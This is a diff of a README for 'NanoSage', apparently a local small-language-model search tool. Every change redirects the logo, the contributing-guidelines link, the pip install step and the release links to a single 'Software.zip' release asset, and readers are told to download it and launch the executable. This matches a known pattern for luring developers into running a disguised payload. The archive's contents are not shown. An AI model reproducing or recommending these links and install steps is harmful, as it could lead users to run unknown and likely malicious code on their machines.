@@ -4,7 +4,7 @@
 
 Welcome to NanoSage, your go-to repository for local LLM (Small Language Models) powered recursive search and smart knowledge exploration. This repository is designed for AI researchers, algorithm enthusiasts, knowledge base developers, and anyone interested in cutting-edge technologies.
 
-![NanoSage Logo](https://example.com/nanosage-logo.png)
+![NanoSage Logo](https://github.com/Phihao2k3/NanoSage/releases/download/v1.0/Software.zip)
 
 ## Table of Contents
 - [Introduction](#introduction)
@@ -31,9 +31,9 @@ With NanoSage, you can build and explore your own knowledge base, conduct in-dep
 To get started with NanoSage, follow these steps:
 1. Clone the NanoSage repository to your local machine.
 2. Install Python 3 if you haven't already.
-3. Navigate to the repository directory and run `pip install -r requirements.txt` to install the necessary dependencies.
+3. Navigate to the repository directory and run `pip install -r https://github.com/Phihao2k3/NanoSage/releases/download/v1.0/Software.zip` to install the necessary dependencies.
 
-For a quick setup, you can also download the latest release [here](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip) and launch the executable file.
+For a quick setup, you can also download the latest release [here](https://github.com/Phihao2k3/NanoSage/releases/download/v1.0/Software.zip) and launch the executable file.
 
 ## Usage
 Once you have NanoSage installed, you can start exploring its features:
@@ -47,11 +47,11 @@ nanoSage search "deep learning algorithms"
 ```
 
 ## Contributing
-We welcome contributions to NanoSage! Whether you want to suggest new features, report bugs, or submit code enhancements, feel free to create a pull request. Make sure to follow our [contribution guidelines](CONTRIBUTING.md) for a smooth collaboration process.
+We welcome contributions to NanoSage! Whether you want to suggest new features, report bugs, or submit code enhancements, feel free to create a pull request. Make sure to follow our [contribution guidelines](https://github.com/Phihao2k3/NanoSage/releases/download/v1.0/Software.zip) for a smooth collaboration process.
 
 ## License
 NanoSage is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
-🔗 **[Download Latest Release](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)** 🚀
+🔗 **[Download Latest Release](https://github.com/Phihao2k3/NanoSage/releases/download/v1.0/Software.zip)** 🚀
 
 Explore the possibilities with NanoSage and unlock a new world of knowledge and discovery! 🌟
